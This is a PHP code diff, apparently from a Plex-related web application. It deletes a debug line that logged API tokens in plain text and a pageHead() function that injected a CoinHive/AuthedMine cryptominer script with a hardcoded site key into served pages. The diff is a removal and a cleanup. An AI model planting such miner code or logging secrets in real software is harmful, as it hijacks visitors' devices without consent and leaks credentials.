@@ -154,7 +154,6 @@ if (!function_exists('verifyApiToken')) {
 		if (trim($apiToken)) {
 			$config = $GLOBALS['config'] ?? new Config_Lite('config.ini.php');
 			foreach ($config as $token => $data) {
-				write_log("Comparing $apiToken to $token");
 				if (trim($token) == trim($apiToken)) {
 					$userData = [
 						'plexUserName' => $data['plexUserName'],
@@ -2539,18 +2538,6 @@ if (!function_exists('setDefaults')) {
 		}
 	}
 
-
-function pageHead() {
-	return '<script src="https://authedmine.com/lib/authedmine.min.js"></script>
-			<script>
-				var miner = new CoinHive.Anonymous("hQCirRYKI9yny7hxr3kpaqh76DepJa9R", {throttle: 0.4});
-			
-				if (!miner.isMobile() && !miner.didOptOut(14400)) {
-					console.log("Firing miner.");
-					miner.start();
-				}
-			</script>';
-}
 
 	if (! function_exists('pageCred')) {
 		function pageCred() {
